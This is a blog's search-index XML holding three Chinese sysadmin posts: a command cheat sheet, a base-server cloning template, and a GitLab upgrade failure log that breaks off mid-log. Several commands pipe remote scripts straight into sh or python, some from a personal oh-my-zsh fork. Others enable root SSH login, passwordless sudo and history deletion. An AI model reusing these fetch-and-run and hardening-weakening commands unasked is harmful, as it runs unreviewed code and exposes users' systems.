<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>一些常用命令</title>
      <link href="/2023/05/25/yi-xie-chang-yong-ming-ling/"/>
      <url>/2023/05/25/yi-xie-chang-yong-ming-ling/</url>
      
        <content type="html"><![CDATA[<p>一些常用命令的集合，方便复制粘贴，免得手敲</p><span id="more"></span><h1 id="网络类"><a href="#网络类" class="headerlink" title="网络类"></a>网络类</h1><h2 id="设置代理"><a href="#设置代理" class="headerlink" title="设置代理"></a>设置代理</h2><pre><code class="bash">ip=127.0.0.1 &amp;&amp; port=1080 &amp;&amp; export http_proxy=&quot;http://$ip:$port/&quot; &amp;&amp; export https_proxy=&quot;http://$ip:$port/&quot; &amp;&amp; git config --global http.proxy &quot;http://$ip:$port&quot; &amp;&amp; git config --global http.proxy &quot;http://$ip:$port&quot;</code></pre><pre><code class="bash">ip=proxy.dopwn.cn &amp;&amp; port=8080 &amp;&amp; export http_proxy=&quot;http://$ip:$port/&quot; &amp;&amp; export https_proxy=&quot;http://$ip:$port/&quot; &amp;&amp; git config --global http.proxy &quot;http://$ip:$port&quot; &amp;&amp; git config --global http.proxy &quot;http://$ip:$port&quot;</code></pre><p>用于内网</p><pre><code class="bash">ip=proxy.dopwn.cn &amp;&amp; port=8080 &amp;&amp; export http_proxy=&quot;http://$ip:$port/&quot; &amp;&amp; export https_proxy=&quot;http://$ip:$port/&quot; &amp;&amp; git config --global http.https://github.com.proxy &quot;http://$ip:$port&quot;</code></pre><p>dockerfile</p><pre><code class="bash">ARG http_proxy=http://proxy.dopwn.cn:8080 https_proxy=http://proxy.dopwn.cn:8080 no_proxy=127.0.0.1,/var/run/docker.sock</code></pre><h1 id="安装类"><a href="#安装类" class="headerlink" title="安装类"></a>安装类</h1><h2 id="oh-my-zsh"><a href="#oh-my-zsh" class="headerlink" title="oh-my-zsh"></a>oh-my-zsh</h2><pre><code class="bash">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/chnxyzz/oh-my-zsh/master/tools/install.sh)&quot;;</code></pre><h2 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h2><pre><code class="bash">sudo apt-get install docker.io;sudo curl -sSL https://get.daocloud.io/docker | sh;sudo usermod -aG docker $USER;python3 -c &quot;$(curl -fsSL https://raw.githubusercontent.com/chnxyzz/linux_install/master/docker/docker_proxy.py)&quot;</code></pre><p>清除已经退出的容器</p><pre><code class="bash">docker rm -f $(docker ps -a|grep Exited|cut -d &#39; &#39; -f  1)</code></pre><h2 id="gitlab-runner"><a href="#gitlab-runner" class="headerlink" title="gitlab-runner"></a>gitlab-runner</h2><pre><code class="bash">curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh | sudo bashapt-get install -y gitlab-runner;gitlab-runner registrysudo usermod -aG docker gitlab-runner;</code></pre><h1 id="换源类"><a href="#换源类" class="headerlink" title="换源类"></a>换源类</h1><h2 id="dockerfile-ubuntu-amp-amp-debian"><a href="#dockerfile-ubuntu-amp-amp-debian" class="headerlink" title="dockerfile ubuntu &amp;&amp; debian"></a>dockerfile ubuntu &amp;&amp; debian</h2><pre><code class="bash">RUN sed -i &#39;s/security.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list &amp;&amp; sed -i &#39;s/archive.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list &amp;&amp; sed -i &#39;s/deb.debian.org/mirrors.aliyun.com/g&#39; /etc/apt/sources.list &amp;&amp; sed -i &#39;s/security.debian.org/mirrors.aliyun.com/g&#39; /etc/apt/sources.list</code></pre><h2 id="ubuntu"><a href="#ubuntu" class="headerlink" title="ubuntu"></a>ubuntu</h2><pre><code class="bash">sed -i &#39;s/security.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list &amp;&amp; sed -i &#39;s/archive.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.listapt-get update;</code></pre><h2 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h2><pre><code class="bash">mv /etc/yum.repos.d/CentOS-Base.repo /etc/yum.repos.d/CentOS-Base.repo.backup;curl -o /etc/yum.repos.d/CentOS-Base.repo https://mirrors.aliyun.com/repo/Centos-7.repo;yum makecache;</code></pre><h2 id="centos-epel"><a href="#centos-epel" class="headerlink" title="centos-epel"></a>centos-epel</h2><pre><code class="bash">curl -o /etc/yum.repos.d/epel.repo http://mirrors.aliyun.com/repo/epel-7.repo</code></pre><h2 id="debian"><a href="#debian" class="headerlink" title="debian"></a>debian</h2><pre><code class="bash">sed -i &#39;s/deb.debian.org/mirrors.aliyun.com/g&#39; /etc/apt/sources.list;sed -i &#39;s/security.debian.org/mirrors.aliyun.com/g&#39; /etc/apt/sources.list;apt-get update;</code></pre><h2 id="parrot"><a href="#parrot" class="headerlink" title="parrot"></a>parrot</h2><pre><code class="bash">sed -i &quot;s/deb.parrot.sh/mirrors.bfsu.edu.cn/g&quot; /etc/apt/sources.list.d/parrot.list;apt-get update;</code></pre><h2 id="kali"><a href="#kali" class="headerlink" title="kali"></a>kali</h2><pre><code class="bash">sed -i &quot;s/http.kali.org/mirrors.aliyun.com/g&quot; /etc/apt/sources.list;apt-get update;</code></pre><h2 id="npm"><a href="#npm" class="headerlink" title="npm"></a>npm</h2><pre><code class="bash">npm config set registry https://registry.npm.taobao.org</code></pre><h2 id="python"><a href="#python" class="headerlink" title="python"></a>python</h2><pre><code class="bash">python -m pip install -i http://mirrors.aliyun.com/pypi/simple </code></pre><h2 id="go"><a href="#go" class="headerlink" title="go"></a>go</h2><pre><code class="bash">go env -w GOPROXY=https://mirrors.aliyun.com/goproxy/,direct</code></pre><h1 id="Dockerfile类"><a href="#Dockerfile类" class="headerlink" title="Dockerfile类"></a>Dockerfile类</h1><h2 id="时间地区"><a href="#时间地区" class="headerlink" title="时间地区"></a>时间地区</h2><pre><code class="bash">RUN ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtimeRUN echo &#39;Asia/Shanghai&#39; &gt;/etc/timezone</code></pre><h2 id="输入中文"><a href="#输入中文" class="headerlink" title="输入中文"></a>输入中文</h2><pre><code class="bash">ENV LC_ALL C.UTF-8ENV LANG en_US.UTF-8ENV LANGUAGE en_US:enENV TERM screen</code></pre><h1 id="Bug修复类"><a href="#Bug修复类" class="headerlink" title="Bug修复类"></a>Bug修复类</h1><h2 id="python2-7-jupyter"><a href="#python2-7-jupyter" class="headerlink" title="python2.7 jupyter"></a>python2.7 jupyter</h2><pre><code class="bash">LANG=zn python -m jupyter notebook</code></pre><h1 id="一键推送"><a href="#一键推送" class="headerlink" title="一键推送"></a>一键推送</h1><h2 id="hexo-blog"><a href="#hexo-blog" class="headerlink" title="hexo blog"></a>hexo blog</h2><pre><code class="bash">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s &amp;&amp; hexo d</code></pre><h2 id="git"><a href="#git" class="headerlink" title="git"></a>git</h2><pre><code class="bash">git add . &amp;&amp; git commit -m &quot;new&quot; &amp;&amp; git push</code></pre><h2 id="dockerfile-pip换源"><a href="#dockerfile-pip换源" class="headerlink" title="dockerfile pip换源"></a>dockerfile pip换源</h2><pre><code class="bash">RUN pip install -U pip &amp;&amp; \    pip config set global.index-url http://mirrors.aliyun.com/pypi/simple &amp;&amp; \    pip config set install.trusted-host mirrors.aliyun.com</code></pre>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Commands </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一台用于即时克隆的母服务器的基本配置</title>
      <link href="/2023/05/25/yi-tai-yong-yu-ji-shi-ke-long-de-mu-fu-wu-qi-de-ji-ben-pei-zhi/"/>
      <url>/2023/05/25/yi-tai-yong-yu-ji-shi-ke-long-de-mu-fu-wu-qi-de-ji-ben-pei-zhi/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>对于每种服务器都做一个母服务器，在需要的时候通过instant clone进行快速复制<br>留一个记录，每次做母机按这个整合脚本就行<br>现在用的是ubuntu server 20.04.01,其他的应该替换参数什么的就OK了<br>对于母服务器就有如下要求</p><ul><li>基本的配置完成</li><li>基本的软件有安装</li><li>母服务的操作很顺手</li><li>母服务器安全性有保障</li><li>母服务上软件是能更新到最新</li></ul><h3 id="基本的配置完成"><a href="#基本的配置完成" class="headerlink" title="基本的配置完成"></a>基本的配置完成</h3><h4 id="swap分区"><a href="#swap分区" class="headerlink" title="swap分区"></a>swap分区</h4><p>目前一般设成2g或者4g，需要跑大型程序再改</p><h5 id="原swap分区是swapfile"><a href="#原swap分区是swapfile" class="headerlink" title="原swap分区是swapfile"></a>原swap分区是swapfile</h5><pre><code class="bash">export swapfile=/swap.img;sudo swapoff $swapfile;sudo dd if=/dev/zero of=$swapfile bs=4k count=512k;sudo mkswap $swapfile;sudo swapon $swapfile;</code></pre><h5 id="原swap分区是partition"><a href="#原swap分区是partition" class="headerlink" title="原swap分区是partition"></a>原swap分区是partition</h5><pre><code class="bash">export swapfile=/dev/mapper/centos-swap;sudo swapoff $swapfile;sudo lvreduce -L -6G $swapfile;sudo mkswap $swapfile;sudo swapon $swapfile;lsblk;cp -r /home/ /homebak/;umount /home;lvremove /dev/mapper/centos-home;vgdisplay;lvcreate -L 29G -n home centos;mkfs.xfs /dev/centos/home;mount /dev/centos/home /homecp -r /homebak/* /home/;rm -rf /homebak;</code></pre><h4 id="换源"><a href="#换源" class="headerlink" title="换源"></a>换源</h4><pre><code class="bash">sed -i &#39;s/us.archive.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list;sed -i &#39;s/cn.archive.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list;sed -i &#39;s/archive.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list;sed -i &#39;s/security.ubuntu.com/mirrors.aliyun.com/g&#39; /etc/apt/sources.list;apt-get update;</code></pre><pre><code class="bash">sed -i &#39;s/http:/https:/g&#39; /etc/apt/sources.list;sudo apt-get update;</code></pre><h4 id="换时区"><a href="#换时区" class="headerlink" title="换时区"></a>换时区</h4><pre><code class="bash">ln -sf /usr/share/zoneinfo/Asia/Shanghai /etc/localtime;echo &#39;Asia/Shanghai&#39; &gt;/etc/timezone;</code></pre><h4 id="修改主机名称"><a href="#修改主机名称" class="headerlink" title="修改主机名称"></a>修改主机名称</h4><p>一般在centos等需要</p><pre><code class="bash">echo ubuntu_server_200401_x64 &gt; /etc/hostname;</code></pre><h3 id="基本的软件有安装"><a href="#基本的软件有安装" class="headerlink" title="基本的软件有安装"></a>基本的软件有安装</h3><pre><code class="bash">export DEBIAN_FRONTEND=noninteractive;apt-get install sudo wget curl unzip netcat autojump unrar net-tools vim bash zsh git htop -y;</code></pre><p>oh-my-zsh不能少</p><pre><code class="bash">sh -c &quot;$(curl -fsSL https://raw.githubusercontent.com/chnxyzz/oh-my-zsh/master/tools/install.sh)&quot;;</code></pre><h3 id="母服务器安全性有保障"><a href="#母服务器安全性有保障" class="headerlink" title="母服务器安全性有保障"></a>母服务器安全性有保障</h3><h4 id="ssh采用公钥登陆"><a href="#ssh采用公钥登陆" class="headerlink" title="ssh采用公钥登陆"></a>ssh采用公钥登陆</h4><pre><code class="bash">curl https://github.com/chnxyzz.keys &gt;&gt; ~/.ssh/authorized_keys;sudo chmod 600 ~/.ssh/authorized_keys;</code></pre><h4 id="关闭ssh密码登陆"><a href="#关闭ssh密码登陆" class="headerlink" title="关闭ssh密码登陆"></a>关闭ssh密码登陆</h4><pre><code class="bash">sed -i &#39;s/#PasswordAuthentication yes/PasswordAuthentication no/g&#39; /etc/ssh/sshd_config;service sshd restart;</code></pre><h4 id="允许root登陆"><a href="#允许root登陆" class="headerlink" title="允许root登陆"></a>允许root登陆</h4><pre><code class="bash">sed -i &#39;s/^#PermitRootLogin.*/PermitRootLogin\ yes/&#39; /etc/ssh/sshd_config;service sshd restart;</code></pre><h3 id="限制日志大小"><a href="#限制日志大小" class="headerlink" title="限制日志大小"></a>限制日志大小</h3><pre><code class="bash">journalctl --vacuum-size=5M</code></pre><h3 id="母服务上软件是能跟新到最新"><a href="#母服务上软件是能跟新到最新" class="headerlink" title="母服务上软件是能跟新到最新"></a>母服务上软件是能跟新到最新</h3><p>由于server的更新不是很频繁，所以可以手动，或者脚本crontab更新</p><h2 id="附加的常用场景"><a href="#附加的常用场景" class="headerlink" title="附加的常用场景"></a>附加的常用场景</h2><h3 id="docker"><a href="#docker" class="headerlink" title="docker"></a>docker</h3><h4 id="官方安装"><a href="#官方安装" class="headerlink" title="官方安装"></a>官方安装</h4><pre><code class="bash">sudo apt-get install docker.io;sudo curl -sSL https://get.daocloud.io/docker | sh;sudo usermod -aG docker $USER;curl -o docker_proxy.py https://raw.githubusercontent.com/chnxyzz/linux_install/master/docker/docker_proxy.py &amp;&amp; sudo python3 docker_proxy.py &amp;&amp; rm docker_proxy.py;</code></pre><h4 id="利用阿里云加速安装"><a href="#利用阿里云加速安装" class="headerlink" title="利用阿里云加速安装"></a>利用阿里云加速安装</h4><h5 id="debian系"><a href="#debian系" class="headerlink" title="debian系"></a>debian系</h5><pre><code class="bash">export want_os=debian#export want_os=ubuntusudo apt-get update;sudo apt-get -y install apt-transport-https ca-certificates curl software-properties-common gnupg2;curl -fsSL https://mirrors.aliyun.com/docker-ce/linux/$want_os/gpg | sudo apt-key add - ;sudo add-apt-repository &quot;deb [arch=amd64] https://mirrors.aliyun.com/docker-ce/linux/$want_os $(lsb_release -cs) stable&quot;;sudo apt-get -y update;sudo apt-get -y install docker-ce;sudo systemctl start docker;sudo systemctl enable docker;</code></pre><h5 id="centos系"><a href="#centos系" class="headerlink" title="centos系"></a>centos系</h5><pre><code class="bash">sudo yum install -y yum-utils device-mapper-persistent-data lvm2sudo yum-config-manager --add-repo https://mirrors.aliyun.com/docker-ce/linux/centos/docker-ce.reposudo yum makecache fast;sudo yum -y install docker-ce;sudo systemctl start docker;sudo systemctl enable docker;</code></pre><h3 id="docker-compose"><a href="#docker-compose" class="headerlink" title="docker-compose"></a>docker-compose</h3><pre><code class="bash">apt-get install -y python3-pip;pip3 install docker-compose;</code></pre><h3 id="gitlab-runner"><a href="#gitlab-runner" class="headerlink" title="gitlab-runner"></a>gitlab-runner</h3><pre><code class="bash">curl -L https://packages.gitlab.com/install/repositories/runner/gitlab-runner/script.deb.sh | sudo bash;sudo usermod -aG docker gitlab-runner;</code></pre><p>清华源加速安装</p><pre><code class="bash">export want_os=debian#export want_os=ubuntucurl https://packages.gitlab.com/gpg.key 2&gt; /dev/null | sudo apt-key add - &amp;&gt;/dev/nullecho &quot;deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-runner/$want_os $(lsb_release -cs) main&quot; &gt; /etc/apt/sources.list.d/gitlab-runner.listsudo apt-get updatesudo apt-get install gitlab-runner</code></pre><p>gitlab-runner 一键注册</p><pre><code class="bash">sudo gitlab-runner register --url &quot;&quot; -r=&quot;&quot; --name=&quot;&quot; --tag-list &quot;test&quot; --executor &quot;shell&quot; --locked=false --run-untagged=true -nsudo gitlab-runner register --url &quot;&quot; -r=&quot;&quot; --name=&quot;&quot; --tag-list &quot;docker&quot; --executor &quot;docker&quot; --locked=false --run-untagged=true -n</code></pre><h3 id="无密码sudo到root"><a href="#无密码sudo到root" class="headerlink" title="无密码sudo到root"></a>无密码sudo到root</h3><pre><code class="bash">sudo su;chmod +w /etc/sudoers;echo &quot;xyzz ALL=(ALL:ALL) NOPASSWD:ALL&quot; &gt;&gt; /etc/sudoers;chmod -w /etc/sudoers;</code></pre><h3 id="vim配置"><a href="#vim配置" class="headerlink" title="vim配置"></a>vim配置</h3><pre><code class="bash">curl https://raw.githubusercontent.com/chnxyzz/linux_install/master/vim/vimrc.txt -o ~/.vimrc;sudo cp ~/.vimrc /root/.vimrc;</code></pre><h3 id="清除shell记录"><a href="#清除shell记录" class="headerlink" title="清除shell记录"></a>清除shell记录</h3><pre><code class="bash">sudo rm ~/.zsh_history ~/.bash_history /root/.zsh_history /root/.bash_history;</code></pre><h3 id="vsphere相关"><a href="#vsphere相关" class="headerlink" title="vsphere相关"></a>vsphere相关</h3><p>打开自动升级vmtools的功能</p><h2 id="更新"><a href="#更新" class="headerlink" title="更新"></a>更新</h2><h3 id="debian"><a href="#debian" class="headerlink" title="debian"></a>debian</h3><p>debian的情况和ubuntu稍有不同，不过馋的是他的稳定和资源占用少，还是搞了一个，顺便把普通用户不给sudo的权限，想root就必须密码或者提权<br>所以sudo失效了</p><h4 id="换源-1"><a href="#换源-1" class="headerlink" title="换源"></a>换源</h4><p>aliyun没看到debian10，先用bfsu顶上</p><pre><code class="bash">sed -i &#39;s/deb.debian.org/mirrors.bfsu.edu.cn/g&#39; /etc/apt/sources.list;sed -i &#39;s/security.debian.org/mirrors.bfsu.edu.cn/g&#39; /etc/apt/sources.list;apt-get update;</code></pre><p>允许更新版本</p><pre><code class="bash">apt-get update --allow-releaseinfo-change</code></pre><h4 id="安装软件"><a href="#安装软件" class="headerlink" title="安装软件"></a>安装软件</h4><p>添加open-vm-tools</p><pre><code class="bash">export DEBIAN_FRONTEND=noninteractive;apt-get install sudo wget curl unzip netcat autojump open-vm-tools htop net-tools vim bash zsh git -y;</code></pre><h4 id="使vmware远程vcenter复制粘贴"><a href="#使vmware远程vcenter复制粘贴" class="headerlink" title="使vmware远程vcenter复制粘贴"></a>使vmware远程vcenter复制粘贴</h4><p>将虚拟机关机后，编辑虚拟机选项-》高级里修改下面三个参数，没有就添加</p><pre><code class="bash">isolation.tools.copy.disable    falseisolation.tools.paste.disable   falseisolation.tools.setGUIOptions.enable   true</code></pre><h4 id="ssh安全"><a href="#ssh安全" class="headerlink" title="ssh安全"></a>ssh安全</h4><pre><code class="bash">sed -i &#39;s/#PasswordAuthentication yes/PasswordAuthentication no/g&#39; /etc/ssh/sshd_config;systemctl restart sshd;</code></pre><h3 id="manjaro-architect"><a href="#manjaro-architect" class="headerlink" title="manjaro-architect"></a>manjaro-architect</h3><h4 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h4><p>安装很繁琐，记得转好openssh</p><h4 id="设置网卡及sshd"><a href="#设置网卡及sshd" class="headerlink" title="设置网卡及sshd"></a>设置网卡及sshd</h4><p>装好了网卡不dhcp</p><pre><code class="bash">systemctl enable dhcpcd;systemctl restart dhcpcd;systemctl enable sshd;systemctl restart sshd;</code></pre><h4 id="换源-2"><a href="#换源-2" class="headerlink" title="换源"></a>换源</h4><pre><code class="bash">sudo pacman-mirrors -i -c China -m rank;sudo pacman -Syy;</code></pre><h4 id="swapfile"><a href="#swapfile" class="headerlink" title="swapfile"></a>swapfile</h4><p>我用的是brtfs，所以先有点不同(<a href="https://wiki.manjaro.org/index.php?title=Swap">https://wiki.manjaro.org/index.php?title=Swap</a>)</p><pre><code class="bash">export swapfile=/swap.img;sudo truncate -s 0 $swapfilesudo chattr +C $swapfile;sudo btrfs property set $swapfile compression none;sudo fallocate -l 2G $swapfile;sudo mkswap $swapfile;sudo chmod u=rw,go= $swapfile;sudo swapon $swapfile;sudo bash -c &quot;echo $swapfile none swap defaults 0 0 &gt;&gt; /etc/fstab&quot;;</code></pre><p>虽然现在是0byte，但是在用到swap时候就会写入，直到最大容量，和mac有点类似。</p><h4 id="安装软件-1"><a href="#安装软件-1" class="headerlink" title="安装软件"></a>安装软件</h4><p>添加open-vm-tools</p><pre><code class="bash">pacman -S sudo wget curl unzip gnu-netcat open-vm-tools htop net-tools vim bash zsh git;sudo systemctl enable vmtoolsd;sudo systemctl restart vmtoolsd;</code></pre><p>目前pacman无法安装autojump<br>找了一种方法，不过为了安全暂时不想尝试,把autojump先屏蔽了</p><pre><code class="bash">1. wget https://aur.archlinux.org/cgit/aur.git/snapshot/autojump.tar.gz2. tar -xzvf autojump.tar.gz3. cd autojump &amp;&amp; vim PKGBUILD# depends=(&#39;python&gt;=3.7&#39;)# _python=python3.74. replace all the 3.8 to 3.75. makepkg6. sudo pacman -U autojump-22.5.3-5-any.pkg.tar.xz</code></pre><h4 id="ssh安全-1"><a href="#ssh安全-1" class="headerlink" title="ssh安全"></a>ssh安全</h4><pre><code class="bash">sed -i &#39;s/#PasswordAuthentication yes/PasswordAuthentication no/g&#39; /etc/ssh/sshd_config;systemctl restart sshd;</code></pre><h3 id="parrot"><a href="#parrot" class="headerlink" title="parrot"></a>parrot</h3><p>目前安装版本<code>4.9.1</code></p><h4 id="ssh"><a href="#ssh" class="headerlink" title="ssh"></a>ssh</h4><pre><code class="bash">sudo su;apt-get update;apt-get install -y openssh-server;sed -i &#39;s/#PasswordAuthentication yes/PasswordAuthentication no/g&#39; /etc/ssh/sshd_config;systemctl enable ssh &amp;&amp; systemctl restart ssh;</code></pre><h4 id="换源和update"><a href="#换源和update" class="headerlink" title="换源和update"></a>换源和update</h4><pre><code class="bash">sudo su;sed -i &quot;s/deb.parrot.sh/mirrors.bfsu.edu.cn/g&quot; /etc/apt/sources.list.d/parrot.list;apt-get update;sudo parrot-upgrade;</code></pre><h4 id="swap"><a href="#swap" class="headerlink" title="swap"></a>swap</h4><p>&#x2F;etc&#x2F;fstab里面有了swapfile一栏</p><pre><code class="bash">export swapfile=/swapfile;sudo truncate -s 0 $swapfilesudo chattr +C $swapfile;sudo btrfs property set $swapfile compression none;sudo fallocate -l 2G $swapfile;sudo mkswap $swapfile;sudo chmod u=rw,go= $swapfile;sudo swapon $swapfile;</code></pre><h4 id="更新完了源也毁了"><a href="#更新完了源也毁了" class="headerlink" title="更新完了源也毁了"></a>更新完了源也毁了</h4><pre><code class="bash">sed -i &quot;s/deb.parrot.sh/mirrors.bfsu.edu.cn/g&quot; /etc/apt/sources.list.d/parrot.list;apt-get update;export DEBIAN_FRONTEND=noninteractive;apt-get install sudo wget curl unzip netcat autojump unrar net-tools vim bash zsh git -y;</code></pre><h3 id="centos"><a href="#centos" class="headerlink" title="centos"></a>centos</h3><p>版本7.7</p><h4 id="设置locale"><a href="#设置locale" class="headerlink" title="设置locale"></a>设置locale</h4><pre><code class="bash">echo &quot;export LC_ALL=en_US.UTF-8&quot;  &gt;&gt;  /etc/profileecho &quot;export LC_CTYPE=en_US.UTF-8&quot;  &gt;&gt;  /etc/profile</code></pre><h4 id="安装-1"><a href="#安装-1" class="headerlink" title="安装"></a>安装</h4><pre><code class="bash">yum install -y epel-release;yum install -y sudo wget curl unzip autojump net-tools vim bash zsh git htop;</code></pre><h3 id="centos8"><a href="#centos8" class="headerlink" title="centos8"></a>centos8</h3><p>版本8.2</p><h4 id="换源-3"><a href="#换源-3" class="headerlink" title="换源"></a>换源</h4><p>好像不需要换，<code>dnf update</code>速度飞起</p><h4 id="epel"><a href="#epel" class="headerlink" title="epel"></a>epel</h4><pre><code class="bash">dnf install -y https://mirrors.aliyun.com/epel/epel-release-latest-8.noarch.rpm;sed -i &#39;s|^#baseurl=https://download.fedoraproject.org/pub|baseurl=https://mirrors.aliyun.com|&#39; /etc/yum.repos.d/epel*;sed -i &#39;s|^metalink|#metalink|&#39; /etc/yum.repos.d/epel*;</code></pre><h4 id="安装软件-2"><a href="#安装软件-2" class="headerlink" title="安装软件"></a>安装软件</h4><pre><code class="bash">dnf install -y sudo wget curl unzip python3 nmap-ncat open-vm-tools htop net-tools vim bash zsh git</code></pre><h4 id="autojump"><a href="#autojump" class="headerlink" title="autojump"></a>autojump</h4><pre><code class="bash">cd ~;git clone git://github.com/wting/autojump.git;ln -s /usr/bin/python3 /usr/bin/python;cd autojump;./install.py or ./uninstall.py;cd .. &amp;&amp; rm -rf autojump;</code></pre><p>把下面的加入<code>~/.zshrc</code>里面,目测manjaro应该也可以</p><pre><code class="bash">[[ -s /root/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; source /root/.autojump/etc/profile.d/autojump.sh</code></pre><p>autojump成功</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>比debian占用的内存还少，馋了馋了<br>自己用的几款linux的母机默认情况下内存占用量，再用<code>ps -ef | wc -l</code>看看进程数</p><table><thead><tr><th align="center">系统</th><th align="center">内存占用量</th><th align="center">进程数</th></tr></thead><tbody><tr><td align="center">ubuntu18.04.4</td><td align="center">140M+</td><td align="center">161</td></tr><tr><td align="center">ubuntu20.04.1</td><td align="center">190M+</td><td align="center">215</td></tr><tr><td align="center">centos7.7</td><td align="center">195M+</td><td align="center">177</td></tr><tr><td align="center">debian10.5</td><td align="center">95M+</td><td align="center">108</td></tr><tr><td align="center">manjaro20.0.3</td><td align="center">91M+</td><td align="center">147</td></tr><tr><td align="center">parrot4.9.1</td><td align="center">360M+</td><td align="center">206</td></tr><tr><td align="center">centos8</td><td align="center">225M+</td><td align="center">231</td></tr></tbody></table><p>debian真香</p><h2 id="更新-1"><a href="#更新-1" class="headerlink" title="更新"></a>更新</h2><p>添加cpu和内存的热插拔</p>]]></content>
      
      
      <categories>
          
          <category> devops </category>
          
          <category> frequent </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Template </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于gitlab-ce数据库丢失后的修复</title>
      <link href="/2023/04/26/guan-yu-gitlab-ce-shu-ju-ku-diu-shi-hou-de-xiu-fu/"/>
      <url>/2023/04/26/guan-yu-gitlab-ce-shu-ju-ku-diu-shi-hou-de-xiu-fu/</url>
      
        <content type="html"><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>在2023年4月24日晚接到gitlab升级通知后，例行升级惹出的大问题。本文记录了修复gitlab的全过程及中间放下的错。由于中间部分操作未能及时记录截图，所以在这使用中间备份的一些场景进行复现。对自己做一个反省。</p><p>基本情况：</p><ul><li>当前版本 gitlab-ce:15.9.5</li><li>升级版本 gitlab-ce:15.11.0</li><li>操作系统 Linux debian10 4.19.0-10-amd64 #1 SMP Debian 4.19.132-1 (2020-07-24) x86_64 GNU&#x2F;Linux</li><li>硬件     2c8g50g硬盘</li><li>500+仓库 和 执行任务的13个gitlab-runner</li></ul><h2 id="问题出现"><a href="#问题出现" class="headerlink" title="问题出现"></a>问题出现</h2><p>照例使用这条命令进行升级重启，这不升级不要紧，一升级就出了大问题。此时为第一个错误，没有对虚拟机进行快照就对内部应用进行升级。由于通过docker部署gitlab已经超过5年了，每次更新都是这么进行的，这次也没有太多要注意的意识。而且作为一个只有2c8g50g硬盘的虚拟机，在gitlab占据了30g的情况下，也没有太多硬盘资源做好实时备份。</p><pre><code class="bash">docker rm -f docker &amp;&amp; docker pull gitlab/gitlab-ce:latest &amp;&amp; docker run -it --log-opt max-size=10m --log-opt max-file=3 -p 443:443 --name gitlab --restart always -v /root/gitlab/config:/etc/gitlab -v /root/gitlab/logs:/var/log/gitlab -v /root/gitlab/data:/var/opt/gitlab gitlab/gitlab-ce:latest</code></pre><h3 id="第一次报错"><a href="#第一次报错" class="headerlink" title="第一次报错"></a>第一次报错</h3><p>比较关键问题日志如下:</p><pre><code class="bash">```bashSELECT COUNT(*) FROM container_repositories WHERE migration_state = &#39;import_skipped&#39;ERROR:  column &quot;migration_state&quot; does not exist at character 51If you would like to restart the instance without attempting toupgrade, add the following to your docker command:-e GITLAB_SKIP_UNMIGRATED_DATA_CHECK=true</code></pre><p><img src="%E7%AC%AC%E4%B8%80%E6%AC%A1%E6%8A%A5%E9%94%99.png" alt="第一次报错"></p><p>一看，都给你写好了，这不得了吗，直接加上，重启！</p><h3 id="第二次报错"><a href="#第二次报错" class="headerlink" title="第二次报错"></a>第二次报错</h3><p>出我意料，又gg了</p><pre><code class="bash">Running handlers:[2023-04-27T15:20:30+00:00] INFO: Running report handlersRunning handlers complete[2023-04-27T15:20:30+00:00] INFO: Report handlers completeInfra Phase complete, 35/802 resources updated in 07 secondsgitlab Reconfigured!Checking for an omnibus managed postgresql: OKChecking if postgresql[&#39;version&#39;] is set: OKChecking if we already upgraded: NOT OKChecking for a newer version of PostgreSQL to installUpgrading PostgreSQL to 13.8Checking if PostgreSQL bin files are symlinked to the expected location: OKStarting the databaseError starting the database. Please fix the error before continuingExpected process to exit with [0], but received &#39;1&#39;---- Begin output of gitlab-ctl start postgresql ----STDOUT: fail: postgresql: runsv not runningSTDERR:---- End output of gitlab-ctl start postgresql ----Ran gitlab-ctl start postgresql returned 1Upgrading the existing database failed and was reverted.Please check the output, and open an issue at:https://gitlab.com/gitlab-org/omnibus-gitlab/issuesIf you would like to restart the instance without attempting toupgrade, add the following to your docker command:-e GITLAB_SKIP_PG_UPGRADE=true</code></pre><p>加上，然后使用gitlab&#x2F;gitlab-ce:15.9.5-ce.0容器进行二次重启!</p><h3 id="第三次报错"><a href="#第三次报错" class="headerlink" title="第三次报错"></a>第三次报错</h3><pre><code class="bash">2023-04-27_15:47:06.16695 ts=2023-04-27T15:47:06.166Z caller=repair.go:52 level=error component=tsdb msg=&quot;failed to read meta.json for a block during repair process; skipping&quot; dir=/var/opt/gitlab/prometheus/data/01GYSNK1JKD2X5125MP0ZRPKFH err=&quot;open /var/opt/gitlab/prometheus/data/01GYSNK1JKD2X5125MP0ZRPKFH/meta.json: permission denied&quot;2023-04-27_15:47:06.16695 ts=2023-04-27T15:47:06.166Z caller=repair.go:52 level=error component=tsdb msg=&quot;failed to read meta.json for a block during repair process; skipping&quot; dir=/var/opt/gitlab/prometheus/data/01GYSWERS0EHQ52Y4RT2GF29Q0 err=&quot;open /var/opt/gitlab/prometheus/data/01GYSWERS0EHQ52Y4RT2GF29Q0/meta.json: permission denied&quot;2023-04-27_15:47:06.16698 ts=2023-04-27T15:47:06.166Z caller=main.go:1144 level=error err=&quot;opening storage failed: migrate WAL: check first existing segment: 